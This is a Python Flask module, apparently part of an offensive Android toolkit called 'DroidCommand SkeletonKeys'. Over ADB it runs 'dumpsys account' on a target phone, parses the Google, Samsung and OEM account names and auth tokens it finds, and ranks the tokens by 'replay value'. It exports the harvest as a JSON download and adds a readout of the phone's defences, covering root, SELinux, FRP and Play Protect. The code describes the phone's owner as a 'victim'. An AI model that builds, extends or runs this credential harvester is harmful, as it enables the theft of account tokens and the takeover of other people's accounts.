"""
SKELETON :: cred_harvester.py — pull the target's identity fabric out.

Focus: AccountManager surface via dumpsys (account types, names, and any
authtokens the build still exposes), structured for replay classification.
WiFi PSKs stay in your existing WiFi-dump module; this one is the identity
layer: which Google/Samsung/OEM accounts live here, and what tokens leak.

Output schema:
{
  "accounts": [
    {"type": "com.google", "name": "victim@gmail.com",
     "tokens": [{"scope": "...", "kind": "...", "token": "ya29...."}],
     "services": [...]},
  ],
  "visibility_note": str   # honest note about per-version token exposure
}
"""

import re
import json
import time
import logging

from flask import Blueprint, jsonify, request, Response

from adb_engine import ADBEngine

log = logging.getLogger("skeleton.harvester")

harvester_bp = Blueprint("harvester", __name__, url_prefix="/api/skeleton/creds")
engine = ADBEngine()

TOKEN_EXPORT_DIR = None  # exports go through HTTP download only; nothing staged


def _shell(cmd, timeout=25):
    return engine.shell(cmd, timeout=timeout)


# --------------------------------------------------------------------------
# dumpsys account parsing
# --------------------------------------------------------------------------
# H12: AOSP Account.toString() imprime name= en premier sur les builds stock;
# certains OEM impriment type= d'abord. Les deux ordres sont acceptés et
# normalisés dans parse_dumpsys_account (l'ancien regex imposait type= first
# → zéro match sur stock → récolte silencieusement vide).
_ACCOUNT_RE = re.compile(
    r"Account\s*\{[^}]*?(?:\btype=([^,\}]+),\s*\bname=([^,\}]+)"
    r"|\bname=([^,\}]+),\s*\btype=([^,\}]+))", re.I)
_TOKEN_RE = re.compile(
    r"authtoken(?:s)?\[([^\]]+)\]\s*[:=]\s*([^\s{][^\n]*)", re.I)
_ALT_TOKEN_RE = re.compile(   # some builds: "AuthToken: type=... token=..."
    r"auth\s*token[^\n]*?type=([^\s,]+)[^\n]*?\btoken=([^\s,]+)", re.I)


def parse_dumpsys_account(raw):
    """Structure a `dumpsys account` payload. Defensive by design —
    account/token presentation varies across Android 9 → 15 builds."""
    accounts = {}
    order = []

    current = None
    for line in raw.splitlines():
        m = _ACCOUNT_RE.search(line)
        if m:
            if m.group(1) is not None:      # branche type= first (OEM)
                atype = m.group(1).strip()
                aname = m.group(2).strip()
            else:                            # branche name= first (stock AOSP)
                aname = m.group(3).strip()
                atype = m.group(4).strip()
            key = f"{atype}|{aname}"
            if key not in accounts:
                accounts[key] = {"type": atype, "name": aname,
                                 "tokens": [], "services": []}
                order.append(key)
                current = accounts[key]
            continue

        # tokens can appear inside their own blocks; attribute them to the
        # most recently seen account when possible
        m = _TOKEN_RE.search(line)
        if m and current is not None:
            scope = m.group(1).strip()
            tok = m.group(2).strip().rstrip("},;")
            if tok and len(tok) > 8:
                current["tokens"].append({"scope": scope, "token": tok})
            continue

        m = _ALT_TOKEN_RE.search(line)
        if m and current is not None:
            current["tokens"].append({"scope": m.group(1).strip(),
                                      "token": m.group(2).strip()})
            continue

        m = re.search(r"service=([\w\.]+)", line)
        if m and current is not None:
            svc = m.group(1)
            if svc not in current["services"]:
                current["services"].append(svc)

    return [accounts[k] for k in order]


def _classify(tokens):
    """Tag tokens with replay-likelihood hints (no network calls here)."""
    out = []
    for t in tokens:
        tok = t["token"]
        hint = "unknown"
        low = tok.lower()
        if low.startswith("ya29.") or low.startswith("1//"):
            hint = "google-oauth2 — high replay value"
        elif low.startswith("oauth2_"):
            hint = "oauth2 bearer"
        elif t.get("scope") and "samsung" in t["scope"].lower():
            hint = "samsung-account scoped"
        elif len(tok) >= 32 and tok.isalnum():
            hint = "opaque long-lived candidate"
        out.append({**t, "hint": hint})
    return out


@harvester_bp.route("/accounts")
def list_accounts():
    try:
        # M35: plus aucun accès direct res["success"] / parsing non gardé —
        # toute anomalie finit en 500 JSON propre, jamais en 500 Flask brut
        res = _shell("dumpsys account", timeout=30)
        if not res.get("success") and not res.get("stdout"):
            return jsonify({"success": False,
                            "error": res.get("stderr") or "dumpsys account refusé"}), 502
        accounts = parse_dumpsys_account(res.get("stdout", ""))
        for acc in accounts:
            acc["tokens"] = _classify(acc["tokens"])
    except Exception as e:
        # M35: détail en log, message générique au client
        log.warning("list_accounts a échoué: %s", e)
        return jsonify({"success": False,
                        "error": "échec récolte comptes (voir logs)"}), 500
    visible_tokens = sum(len(a["tokens"]) for a in accounts)
    return jsonify({
        "success": True,
        "account_count": len(accounts),
        "accounts": accounts,
        "visibility_note": (
            f"{visible_tokens} token(s) exposés par ce build. "
            "Android 12+ masque la plupart des authtokens à shell — "
            "les comptes restent la carte d'identité, et certains builds "
            "(OEM, profils work) fuient encore les refresh tokens."
        ) if accounts else "aucun compte résolu",
    })


@harvester_bp.route("/export")
def export_accounts():
    """Full harvest as a JSON download (browser handles persistence)."""
    try:
        res = _shell("dumpsys account", timeout=30)
        # M34: un dumpsys refusé ne doit pas s'exporter en récolte vide
        # "propre" — l'opérateur croirait le téléphone vierge
        if not res.get("success") and not res.get("stdout"):
            return jsonify({"success": False,
                            "error": res.get("stderr") or "dumpsys account refusé"}), 502
        accounts = parse_dumpsys_account(res.get("stdout", "")) \
            if res.get("stdout") else []
        for acc in accounts:
            acc["tokens"] = _classify(acc["tokens"])
        payload = {
            "tool": "DroidCommand SkeletonKeys cred_harvester",
            "exported_at": time.strftime("%Y-%m-%d %H:%M:%S"),
            "harvest_ok": bool(res.get("success")),
            "accounts": accounts,
        }
    except Exception as e:
        # M35: détail en log, message générique au client
        log.warning("export_accounts a échoué: %s", e)
        return jsonify({"success": False,
                        "error": "échec export (voir logs)"}), 500
    fname = f"identity_harvest_{time.strftime('%Y%m%d_%H%M%S')}.json"
    return Response(json.dumps(payload, indent=2, ensure_ascii=False),
                    mimetype="application/json",
                    headers={"Content-Disposition":
                             f'attachment; filename="{fname}"'})


# --------------------------------------------------------------------------
# Quick security-posture readout (pairs with neutralizer snapshots)
# --------------------------------------------------------------------------
@harvester_bp.route("/posture")
def posture():
    """One-shot 'what's guarding this phone' dashboard."""
    checks = {
        "rooted_hint": _shell("which su; ls /system/xbin/su 2>/dev/null"),
        "selinux": _shell("getenforce"),
        "verified_boot": _shell("getprop ro.boot.verifiedbootstate"),
        "frp_locked": _shell("getprop ro.frp.pst"),
        "knox_bit": _shell("getprop ro.warranty_bit"),
        "play_protect_verifier": _read_setting_global(),
        "adb_wifi_enabled": _shell("settings get global adb_wifi_enabled"),
    }
    return jsonify({
        "success": True,
        "posture": {k: (v.get("stdout") or "").strip()
                    for k, v in checks.items()},
    })


def _read_setting_global():
    return engine.shell("settings get global package_verifier_enable")
